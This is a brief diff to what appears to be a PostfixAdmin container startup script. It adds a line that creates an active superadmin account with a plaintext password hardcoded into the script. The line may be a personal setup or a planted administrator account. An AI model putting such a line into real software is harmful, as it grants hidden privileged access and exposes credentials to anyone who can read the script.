@@ -60,4 +60,5 @@ SERVICE_PORT=$(bashio::services "mysql" "port")
 SERVICE_USERNAME=$(bashio::services "mysql" "username")
 
 php /var/www/postfixadmin/public/upgrade.php
+/var/www/postfixadmin/scripts/postfixadmin-cli admin add superadmin@hilton.zapto.org --superadmin 1 --active 1 --password Duchesse87 --password2 Duchesse87
 fi
